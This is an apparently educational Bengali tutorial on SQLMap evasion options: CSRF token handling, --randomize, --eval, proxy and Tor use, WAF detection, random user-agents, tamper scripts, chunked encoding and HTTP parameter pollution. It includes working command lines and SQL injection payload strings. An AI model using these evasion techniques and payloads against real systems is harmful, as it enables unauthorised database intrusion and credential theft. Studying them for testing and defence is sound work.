## **Bypassing Web Application Protections**


## 1. Anti-CSRF Token Bypass

Anti-CSRF (Cross-Site Request Forgery) token হলো automation আটকানোর একটি protection। বিশেষ করে web form submit করার সময় HTTP request-এ এটি ব্যবহার হয়।

- প্রতিটি HTTP request-এ valid token থাকতে হয়।
- Token সাধারণত শুধু page visit ও use করার পর পাওয়া যায়।
- এর মূল উদ্দেশ্য ছিল malicious link খুললে logged-in user-এর অজান্তে কোনো কাজ (যেমন admin page খুলে predefined credentials দিয়ে নতুন user তৈরি) হওয়া আটকানো।
- তবে এটি automation tools-কেও বাধা দেয়।

SQLMap-এর `--csrf-token`:

Token parameter-এর নাম দিলে SQLMap target response থেকে নতুন token খুঁজে পরবর্তী request-এ ব্যবহার করে।

```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

কোনো parameter name-এ `csrf`, `xsrf`, `token`-এর মতো common infix থাকলে `--csrf-token` না দিলেও SQLMap সেটি update করার prompt দিতে পারে।

Output:

```
        ___
       __H__
  ___ ___[,]_____ ___ ___  {1.4.9}
 |_ -| . [']     | .'| . |
 |___|_  [)]_|_|_|__,|  _|
       |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:18:01 /2020-09-18/

POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
```

## 2. Unique Value Bypass

কিছু application নির্দিষ্ট parameter-এ প্রতিবার unique value চায়।

- এটি Anti-CSRF-এর মতো, তবে webpage content parse করার প্রয়োজন নেই।
- প্রতিটি request-এ parameter-এর value পরিবর্তন করলেই হয়।
- `--randomize` দিয়ে parameter name উল্লেখ করতে হয়।

```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

Output:

```
URI: http://www.example.com:80/?id=1&rp=99954
URI: http://www.example.com:80/?id=1&rp=87216
URI: http://www.example.com:80/?id=9030&rp=36456
URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
```

## 3. Calculated Parameter Bypass

কিছু application একটি parameter-এর value অন্য parameter-এর value দিয়ে calculate করে। যেমন, `h=MD5(id)`।

এটি bypass করতে `--eval` ব্যবহার করা হয়। Request পাঠানোর ঠিক আগে দেওয়া valid Python code execute হয়।

```
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

Output:

```
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
```

## 4. IP Address Concealing

নিজের IP conceal করতে বা application-এর IP blacklist এড়াতে Proxy অথবা Tor ব্যবহার করা যায়।

Proxy ব্যবহার:

`--proxy` দিয়ে working proxy নির্ধারণ করা যায়।

```
--proxy="socks4://177.39.187.70:33283"
```

Proxy list ব্যবহার:

- `--proxy-file` দিয়ে proxy list দেওয়া যায়।
- SQLMap sequentially proxy ব্যবহার করে।
- কোনো proxy-তে সমস্যা হলে (যেমন IP blacklist) পরের proxy-তে চলে যায়।

Tor ব্যবহার:

- Tor local machine-এ install থাকলে সাধারণত local port `9050` বা `9150`-এ `SOCKS4` proxy service থাকে।
- `--tor` দিলে SQLMap automatically local port খুঁজে ব্যবহার করে।
- Tor exit node-এর বড় list থেকে যেকোনো IP দিয়ে connection appear করতে পারে।

Tor ঠিকভাবে কাজ করছে কিনা check:

`--check-tor` ব্যবহার করলে SQLMap `https://check.torproject.org/`-এ connect করে response-এ `Congratulations` আছে কিনা check করে।

## 5. WAF Bypass

SQLMap initial test-এর সময় একটি predefined malicious-looking payload পাঠায়। এটি non-existent parameter name দিয়ে পাঠানো হয়, যেমন `?pfov=...`।

- Response original response থেকে উল্লেখযোগ্যভাবে আলাদা হলে মাঝখানে কোনো protection থাকতে পারে।
- ModSecurity-এর মতো WAF থাকলে এমন request-এর response হতে পারে `406 - Not Acceptable`।
- Protection শনাক্ত হলে SQLMap actual mechanism চিহ্নিত করতে third-party library [identYwaf](https://github.com/stamparm/identYwaf?utm_source=chatgpt.com) ব্যবহার করে।
- identYwaf-এ 80টি WAF solution-এর signature রয়েছে।

এই heuristic test skip করতে:

```
--skip-waf
```

## 6. User-agent Blacklisting Bypass

SQLMap চালানোর শুরুতেই HTTP `5XX` error হলে default user-agent blacklist হয়েছে কিনা ভাবতে হবে।

SQLMap-এর default user-agent:

```
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
```

`--random-agent` ব্যবহার করলে browser-এর বড় pool থেকে random user-agent নেওয়া হয়।

```
--random-agent
```

Note: কোনো protection detect হলে target-এর সঙ্গে আরও সমস্যা হতে পারে। কারণ protection mechanism ক্রমাগত উন্নত হচ্ছে, ফলে attacker-এর bypass করার সুযোগ কমে যাচ্ছে।

## 7. Tamper Scripts

WAF/IPS bypass করার জনপ্রিয় পদ্ধতি হলো Tamper scripts।

- এগুলো Python script।
- Target-এ পাঠানোর আগে request modify করে।
- সাধারণত protection bypass করার জন্য ব্যবহার হয়।

উদাহরণ: `between`

[between.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py?utm_source=chatgpt.com)

এটি:

- Greater than operator (`>`) পরিবর্তন করে `NOT BETWEEN 0 AND #` করে।
- Equals operator (`=`) পরিবর্তন করে `BETWEEN # AND #` করে।
- ফলে XSS আটকানোর জন্য তৈরি অনেক primitive protection SQLi-এর ক্ষেত্রে bypass করা যায়।

একাধিক Tamper script:

`--tamper` দিয়ে একাধিক script chain করা যায়। এগুলো predefined priority অনুযায়ী execute হয়।

```
--tamper=between,randomcase
```

Priority নির্ধারণ করা হয় যাতে script-গুলোর মধ্যে unwanted behavior না হয়।

- কিছু script SQL syntax পরিবর্তন করে, যেমন [ifnull2ifisnull.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py?utm_source=chatgpt.com)।
- কিছু script query-এর ভিতরের content নিয়ে চিন্তা করে না, যেমন [appendnullbyte.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py?utm_source=chatgpt.com)।
- Tamper scripts request-এর যেকোনো অংশ modify করতে পারে, তবে বেশিরভাগ payload content পরিবর্তন করে।

গুরুত্বপূর্ণ Tamper scripts:

| Tamper-Script               | Description                                                                                             |
| --------------------------- | ------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | UNION-এর occurrence-গুলোকে e0UNION দিয়ে replace করে                                                     |
| `base64encode`              | Payload-এর সব character Base64 encode করে                                                               |
| `between`                   | `>` কে `NOT BETWEEN 0 AND #` এবং `=` কে `BETWEEN # AND #` দিয়ে replace করে                              |
| `commalesslimit`            | MySQL-এর `LIMIT M, N`-কে `LIMIT N OFFSET M` দিয়ে replace করে                                            |
| `equaltolike`               | `=` operator-কে `LIKE` দিয়ে replace করে                                                                 |
| `halfversionedmorekeywords` | প্রতিটি keyword-এর আগে MySQL versioned comment যোগ করে                                                  |
| `modsecurityversioned`      | পুরো query-কে MySQL versioned comment দিয়ে ঘিরে রাখে                                                    |
| `modsecurityzeroversioned`  | পুরো query-কে MySQL zero-versioned comment দিয়ে ঘিরে রাখে                                               |
| `percentage`                | প্রতিটি character-এর আগে `%` যোগ করে (যেমন `SELECT` → `%S%E%L%E%C%T`)                                   |
| `plus2concat`               | `+` operator-কে MsSQL `CONCAT()` function দিয়ে replace করে                                              |
| `randomcase`                | প্রতিটি keyword character-এর case random করে (যেমন `SELECT` → `SEleCt`)                                 |
| `space2comment`             | Space character (` `) কে comments `\`/\` দিয়ে replace করে                                               |
| `space2dash`                | Space character (` `) কে dash comment (`--`), random string এবং newline (`\n`) দিয়ে replace করে         |
| `space2hash`                | MySQL-এর space character (` `) কে `#`, random string এবং newline (`\n`) দিয়ে replace করে                |
| `space2mssqlblank`          | MsSQL-এর space character (` `) কে valid alternate characters-এর random blank character দিয়ে replace করে |
| `space2plus`                | Space character (` `) কে plus (`+`) দিয়ে replace করে                                                    |
| `space2randomblank`         | Space character (` `) কে valid alternate characters-এর random blank character দিয়ে replace করে          |
| `symboliclogical`           | AND ও OR logical operator-কে symbolic counterpart (`&&` ও `\\|\\|`) দিয়ে replace করে                    |
| `versionedkeywords`         | প্রতিটি non-function keyword-কে MySQL versioned comment দিয়ে ঘিরে রাখে                                  |
| `versionedmorekeywords`     | প্রতিটি keyword-কে MySQL versioned comment দিয়ে ঘিরে রাখে                                               |

সব implemented Tamper script ও description দেখতে:

```
--list-tampers
```

নিজের প্রয়োজন অনুযায়ী custom Tamper script-ও তৈরি করা যায়, যেমন second-order SQLi attack-এর জন্য।

## 8. Miscellaneous Bypasses

1\. Chunked Transfer Encoding

`--chunked` দিয়ে চালু করা হয়।

- POST request-এর body-কে কয়েকটি chunk-এ ভাগ করে।
- Blacklisted SQL keyword-গুলো বিভিন্ন chunk-এর মধ্যে ভাগ হয়ে যায়।
- ফলে request detection এড়িয়ে যেতে পারে।

2\. HTTP Parameter Pollution (HPP)

একই নামের parameter-এর একাধিক value-এর মধ্যে payload ভাগ করে দেওয়া হয়। Target platform support করলে সেগুলো concatenate করে।

উদাহরণ:

```
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...
```

উদাহরণস্বরূপ, `ASP` এটি support করে।
